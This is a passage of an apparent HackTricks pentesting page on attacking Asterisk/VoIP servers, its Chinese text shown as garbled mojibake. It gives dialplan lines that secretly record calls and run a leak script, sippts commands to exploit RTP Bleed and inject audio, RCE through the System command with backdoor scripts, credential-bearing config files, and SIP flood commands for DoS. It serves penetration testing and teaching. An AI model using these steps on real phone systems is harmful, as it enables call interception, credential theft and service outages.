exten =&gt; _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten =&gt; _X.,2,MixMonitor(${NAME})
</code></pre>
<p>{% endcode %}</p>
<p>é€šè¯å°†ä¿å­˜åœ¨ <strong><code>/tmp</code></strong>ã€‚</p>
<p>æ‚¨ç”šè‡³å¯ä»¥è®© Asterisk <strong>æ‰§è¡Œä¸€ä¸ªåœ¨é€šè¯ç»“æŸæ—¶æ³„éœ²é€šè¯çš„è„šæœ¬</strong>ã€‚</p>
<pre><code class="language-scss">exten =&gt; h,1,System(/tmp/leak_conv.sh &amp;)
</code></pre>
<h3 id="rtcpbleed-æ¼æ´"><a class="header" href="#rtcpbleed-æ¼æ´">RTCPBleed æ¼æ´</a></h3>
<p><strong>RTCPBleed</strong> æ˜¯ä¸€ä¸ªå½±å“åŸºäº Asterisk çš„ VoIP æœåŠ¡å™¨çš„é‡å¤§å®‰å…¨é—®é¢˜ï¼ˆå‘å¸ƒäº 2017 å¹´ï¼‰ã€‚è¯¥æ¼æ´å…è®¸ <strong>RTPï¼ˆå®æ—¶ä¼ è¾“åè®®ï¼‰æµé‡</strong>ï¼Œå³æ‰¿è½½ VoIP é€šè¯çš„æµé‡ï¼Œè¢« <strong>äº’è”ç½‘ä¸Šçš„ä»»ä½•äººæ‹¦æˆªå’Œé‡å®šå‘</strong>ã€‚è¿™æ˜¯å› ä¸º RTP æµé‡åœ¨é€šè¿‡ NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰é˜²ç«å¢™æ—¶ç»•è¿‡äº†èº«ä»½éªŒè¯ã€‚</p>
<p>RTP ä»£ç†å°è¯•é€šè¿‡åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªå‚ä¸è€…ä¹‹é—´ä»£ç† RTP æµæ¥è§£å†³å½±å“ RTC ç³»ç»Ÿçš„ <strong>NAT é™åˆ¶</strong>ã€‚å½“ NAT å­˜åœ¨æ—¶ï¼ŒRTP ä»£ç†è½¯ä»¶é€šå¸¸æ— æ³•ä¾èµ–é€šè¿‡ä¿¡ä»¤ï¼ˆä¾‹å¦‚ SIPï¼‰è·å–çš„ RTP IP å’Œç«¯å£ä¿¡æ¯ã€‚å› æ­¤ï¼Œä¸€äº› RTP ä»£ç†å®ç°äº†ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—è¿™ç§ <strong>IP å’Œç«¯å£å…ƒç»„èƒ½å¤Ÿè‡ªåŠ¨å­¦ä¹ </strong>ã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡æ£€æŸ¥ä¼ å…¥çš„ RTP æµé‡å¹¶å°†ä»»ä½•ä¼ å…¥ RTP æµé‡çš„æº IP å’Œç«¯å£æ ‡è®°ä¸ºåº”å“åº”çš„æ¥å®Œæˆçš„ã€‚è¿™ç§æœºåˆ¶ï¼Œå¯èƒ½è¢«ç§°ä¸ºâ€œå­¦ä¹ æ¨¡å¼â€ï¼Œ<strong>ä¸ä½¿ç”¨ä»»ä½•å½¢å¼çš„èº«ä»½éªŒè¯</strong>ã€‚å› æ­¤ï¼Œ<strong>æ”»å‡»è€…</strong> å¯ä»¥ <strong>å‘ RTP ä»£ç†å‘é€ RTP æµé‡</strong>ï¼Œå¹¶æ¥æ”¶åŸæœ¬åº”å‘é€ç»™æ­£åœ¨è¿›è¡Œçš„ RTP æµçš„å‘¼å«è€…æˆ–è¢«å«è€…çš„ä»£ç† RTP æµé‡ã€‚æˆ‘ä»¬ç§°è¿™ç§æ¼æ´ä¸º RTP Bleedï¼Œå› ä¸ºå®ƒå…è®¸æ”»å‡»è€…æ¥æ”¶åŸæœ¬åº”å‘é€ç»™åˆæ³•ç”¨æˆ·çš„ RTP åª’ä½“æµã€‚</p>
<p>RTP ä»£ç†å’Œ RTP å †æ ˆçš„å¦ä¸€ä¸ªæœ‰è¶£è¡Œä¸ºæ˜¯ï¼Œæœ‰æ—¶ <strong>å³ä½¿ä¸æ˜“å— RTP Bleed æ¼æ´å½±å“</strong>ï¼Œå®ƒä»¬ä»ä¼š <strong>æ¥å—ã€è½¬å‘å’Œ/æˆ–å¤„ç†æ¥è‡ªä»»ä½•æºçš„ RTP æ•°æ®åŒ…</strong>ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ RTP æ•°æ®åŒ…ï¼Œè¿™å¯èƒ½å…è®¸ä»–ä»¬æ³¨å…¥è‡ªå·±çš„åª’ä½“ï¼Œè€Œä¸æ˜¯åˆæ³•çš„åª’ä½“ã€‚æˆ‘ä»¬ç§°è¿™ç§æ”»å‡»ä¸º RTP æ³¨å…¥ï¼Œå› ä¸ºå®ƒå…è®¸å°†ä¸åˆæ³•çš„ RTP æ•°æ®åŒ…æ³¨å…¥åˆ°ç°æœ‰çš„ RTP æµä¸­ã€‚æ­¤æ¼æ´å¯èƒ½åœ¨ RTP ä»£ç†å’Œç«¯ç‚¹ä¸­å‘ç°ã€‚</p>
<p>Asterisk å’Œ FreePBX ä¼ ç»Ÿä¸Šä½¿ç”¨ <strong><code>NAT=yes</code> è®¾ç½®</strong>ï¼Œè¿™ä½¿å¾— RTP æµé‡èƒ½å¤Ÿç»•è¿‡èº«ä»½éªŒè¯ï¼Œå¯èƒ½å¯¼è‡´é€šè¯ä¸­æ²¡æœ‰éŸ³é¢‘æˆ–å•å‘éŸ³é¢‘ã€‚</p>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://www.rtpbleed.com/">https://www.rtpbleed.com/</a></p>
<ul>
<li><strong><code>SIPPTS rtpbleed</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtpbleed é€šè¿‡å‘é€ RTP æµæ¥æ£€æµ‹ RTP Bleed æ¼æ´ã€‚</li>
</ul>
<pre><code class="language-bash">sippts rtpbleed -i 10.10.0.10
</code></pre>
<ul>
<li><strong><code>SIPPTS rtcpbleed</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtcpbleed é€šè¿‡å‘é€ RTCP æµæ¥æ£€æµ‹ RTP Bleed æ¼æ´ã€‚</li>
</ul>
<pre><code class="language-bash">sippts rtcpbleed -i 10.10.0.10
</code></pre>
<ul>
<li><strong><code>SIPPTS rtpbleedflood</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtpbleedflood åˆ©ç”¨ RTP Bleed æ¼æ´å‘é€ RTP æµã€‚</li>
</ul>
<pre><code class="language-bash">sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
</code></pre>
<ul>
<li><strong><code>SIPPTS rtpbleedinject</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtpbleedinject åˆ©ç”¨ RTP Bleed æ¼æ´æ³¨å…¥éŸ³é¢‘æ–‡ä»¶ï¼ˆWAV æ ¼å¼ï¼‰ã€‚</li>
</ul>
<pre><code class="language-bash">sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
</code></pre>
<h3 id="rce"><a class="header" href="#rce">RCE</a></h3>
<p>åœ¨ Asterisk ä¸­ï¼Œå¦‚æœä½ ä»¥æŸç§æ–¹å¼èƒ½å¤Ÿ <strong>æ·»åŠ æ‰©å±•è§„åˆ™å¹¶é‡æ–°åŠ è½½å®ƒä»¬</strong>ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡æ”»é™·ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç½‘ç»œç®¡ç†æœåŠ¡å™¨ï¼‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ <strong><code>System</code></strong> å‘½ä»¤è·å¾— RCEã€‚</p>
<pre><code class="language-scss">same =&gt; n,System(echo "Called at $(date)" &gt;&gt; /tmp/call_log.txt)
</code></pre>
<p>There is command called <strong><code>Shell</code></strong> that could be used <strong>instead of <code>System</code></strong> to execute system commands if necessary.</p>
<p>{% hint style="warning" %}
å¦‚æœæœåŠ¡å™¨<strong>ä¸å…è®¸åœ¨</strong><code>System</code><strong>å‘½ä»¤ä¸­ä½¿ç”¨æŸäº›å­—ç¬¦</strong>ï¼ˆå¦‚åœ¨Elastixä¸­ï¼‰ï¼Œè¯·æ£€æŸ¥WebæœåŠ¡å™¨æ˜¯å¦å…è®¸<strong>ä»¥æŸç§æ–¹å¼åœ¨ç³»ç»Ÿå†…éƒ¨åˆ›å»ºæ–‡ä»¶</strong>ï¼ˆå¦‚åœ¨Elastixæˆ–trixboxä¸­ï¼‰ï¼Œå¹¶åˆ©ç”¨å®ƒ<strong>åˆ›å»ºä¸€ä¸ªåé—¨è„šæœ¬</strong>ï¼Œç„¶åä½¿ç”¨**<code>System</code><strong>æ¥</strong>æ‰§è¡Œ<strong>è¯¥</strong>è„šæœ¬**ã€‚
{% endhint %}</p>
<h4 id="æœ‰è¶£çš„æœ¬åœ°æ–‡ä»¶å’Œæƒé™"><a class="header" href="#æœ‰è¶£çš„æœ¬åœ°æ–‡ä»¶å’Œæƒé™">æœ‰è¶£çš„æœ¬åœ°æ–‡ä»¶å’Œæƒé™</a></h4>
<ul>
<li><strong><code>sip.conf</code></strong> -&gt; åŒ…å«SIPç”¨æˆ·çš„å¯†ç ã€‚</li>
<li>å¦‚æœ<strong>AsteriskæœåŠ¡å™¨ä»¥rootèº«ä»½è¿è¡Œ</strong>ï¼Œæ‚¨å¯èƒ½ä¼šå±åŠrootæƒé™ã€‚</li>
<li><strong>mysql rootç”¨æˆ·</strong>å¯èƒ½<strong>æ²¡æœ‰ä»»ä½•å¯†ç </strong>ã€‚</li>
<li>è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„mysqlç”¨æˆ·ä½œä¸ºåé—¨ã€‚</li>
<li><strong><code>FreePBX</code></strong></li>
<li><strong><code>amportal.conf</code></strong> -&gt; åŒ…å«Webé¢æ¿ç®¡ç†å‘˜ï¼ˆFreePBXï¼‰çš„å¯†ç ã€‚</li>
<li><strong><code>FreePBX.conf</code></strong> -&gt; åŒ…å«ç”¨äºè®¿é—®æ•°æ®åº“çš„ç”¨æˆ·FreePBXuserçš„å¯†ç ã€‚</li>
<li>è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„mysqlç”¨æˆ·ä½œä¸ºåé—¨ã€‚</li>
<li><strong><code>Elastix</code></strong></li>
<li><strong><code>Elastix.conf</code></strong> -&gt; åŒ…å«å¤šä¸ªæ˜æ–‡å¯†ç ï¼Œå¦‚mysql rootå¯†ç ã€IMAPdå¯†ç ã€Webç®¡ç†å‘˜å¯†ç ã€‚</li>
<li><strong>å¤šä¸ªæ–‡ä»¶å¤¹</strong>å°†å±äºè¢«æ”»é™·çš„asteriskç”¨æˆ·ï¼ˆå¦‚æœä¸æ˜¯ä»¥rootèº«ä»½è¿è¡Œï¼‰ã€‚è¯¥ç”¨æˆ·å¯ä»¥è¯»å–ä¹‹å‰çš„æ–‡ä»¶å¹¶æ§åˆ¶é…ç½®ï¼Œå› æ­¤ä»–å¯ä»¥ä½¿Asteriskåœ¨æ‰§è¡Œæ—¶åŠ è½½å…¶ä»–åé—¨äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li>
</ul>
<h3 id="rtpæ³¨å…¥"><a class="header" href="#rtpæ³¨å…¥">RTPæ³¨å…¥</a></h3>
<p>å¯ä»¥ä½¿ç”¨å·¥å…·å¦‚**<code>rtpinsertsound</code><strong>ï¼ˆ<code>sudo apt install rtpinsertsound</code>ï¼‰å’Œ</strong><code>rtpmixsound</code><strong>ï¼ˆ<code>sudo apt install rtpmixsound</code>ï¼‰åœ¨å¯¹è¯ä¸­æ’å…¥</strong><code>.wav</code>**æ–‡ä»¶ã€‚</p>
<p>æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª<a href="http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/">http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/</a>çš„è„šæœ¬æ¥<strong>æ‰«æå¯¹è¯</strong>ï¼ˆ<strong><code>rtpscan.pl</code></strong>ï¼‰ã€å‘å¯¹è¯å‘é€**<code>.wav</code><strong>ï¼ˆ</strong><code>rtpsend.pl</code><strong>ï¼‰å¹¶åœ¨å¯¹è¯ä¸­</strong>æ’å…¥å™ªéŸ³**ï¼ˆ<strong><code>rtpflood.pl</code></strong>ï¼‰ã€‚</p>
<h3 id="dos"><a class="header" href="#dos">DoS</a></h3>
<p>æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å°è¯•åœ¨VoIPæœåŠ¡å™¨ä¸Šå®ç°DoSã€‚</p>
<ul>
<li>**<code>SIPPTS flood</code><strong>æ¥è‡ª<a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a></strong>ï¼šSIPPTSæ´ªæ°´å‘ç›®æ ‡å‘é€æ— é™æ¶ˆæ¯ã€‚</li>
<li><code>sippts flood -i 10.10.0.10 -m invite -v</code></li>
<li>**<code>SIPPTS ping</code><strong>æ¥è‡ª<a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a></strong>ï¼šSIPPTS pingè¿›è¡ŒSIP pingä»¥æŸ¥çœ‹æœåŠ¡å™¨å“åº”æ—¶é—´ã€‚</li>
<li><code>sippts ping -i 10.10.0.10</code></li>
<li><a href="https://www.kali.org/tools/iaxflood/"><strong>IAXFlooder</strong></a>: DoS IAXåè®®ç”¨äºAsteriskã€‚</li>
<li><a href="https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt"><strong>inviteflood</strong></a>: ä¸€ç§åœ¨UDP/IPä¸Šæ‰§è¡ŒSIP/SDP INVITEæ¶ˆæ¯æ´ªæ°´çš„å·¥å…·ã€‚</li>
<li><a href="https://www.kali.org/tools/rtpflood/"><strong>rtpflood</strong></a>: å‘é€å¤šä¸ªæ ¼å¼è‰¯å¥½çš„RTPæ•°æ®åŒ…ã€‚éœ€è¦çŸ¥é“æ­£åœ¨ä½¿ç”¨çš„RTPç«¯å£ï¼ˆå…ˆå—…æ¢ï¼‰ã€‚</li>
<li><a href="https://github.com/SIPp/sipp"><strong>SIPp</strong></a>: å…è®¸åˆ†æå’Œç”ŸæˆSIPæµé‡ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç”¨äºDoSã€‚</li>
<li><a href="https://github.com/nils-ohlmeier/sipsak"><strong>SIPsak</strong></a>: SIPç‘å£«å†›åˆ€ã€‚ä¹Ÿå¯ä»¥ç”¨äºæ‰§è¡ŒSIPæ”»å‡»ã€‚</li>
<li>Fuzzers: <a href="https://www.kali.org/tools/protos-sip/"><strong>protos-sip</strong></a>, <a href="https://github.com/gremwell/voiper"><strong>voiper</strong></a>.</li>
</ul>
<h3 id="æ“ä½œç³»ç»Ÿæ¼æ´"><a class="header" href="#æ“ä½œç³»ç»Ÿæ¼æ´">æ“ä½œç³»ç»Ÿæ¼æ´</a></h3>
<p>å®‰è£…åƒAsteriskè¿™æ ·çš„è½¯ä»¶æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä¸‹è½½ä¸€ä¸ªå·²ç»å®‰è£…äº†å®ƒçš„<strong>æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆ</strong>ï¼Œä¾‹å¦‚ï¼š<strong>FreePBXã€Elastixã€Trixbox</strong>... è¿™äº›çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œä¸€æ—¦å®ƒå·¥ä½œï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½<strong>ä¸ä¼šå†æ›´æ–°å®ƒä»¬</strong>ï¼Œè€Œ<strong>æ¼æ´</strong>ä¼šéšç€æ—¶é—´çš„æ¨ç§»è¢«å‘ç°ã€‚</p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://github.com/Pepelux/sippts/wiki">https://github.com/Pepelux/sippts/wiki</a></li>
<li><a href="https://github.com/EnableSecurity/sipvicious">https://github.com/EnableSecurity/sipvicious</a></li>
<li><a href="http://blog.pepelux.org/">http://blog.pepelux.org/</a></li>
<li><a href="https://www.rtpbleed.com/">https://www.rtpbleed.com/</a></li>
<li><a href="https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4">https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4</a></li>
<li><a href="https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf">https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦çœ‹å¾…æ‚¨çš„Webåº”ç”¨ç¨‹åºã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>æŸ¥æ‰¾å¹¶æŠ¥å‘Šå…·æœ‰å®é™…ä¸šåŠ¡å½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬20å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼Œå‘ç°è®©æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>æˆ–<strong>åœ¨Twitterä¸Šå…³æ³¨</strong>æˆ‘ä»¬ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-sap.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-voip/basic-voip-protocols/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-sap.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-voip/basic-voip-protocols/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
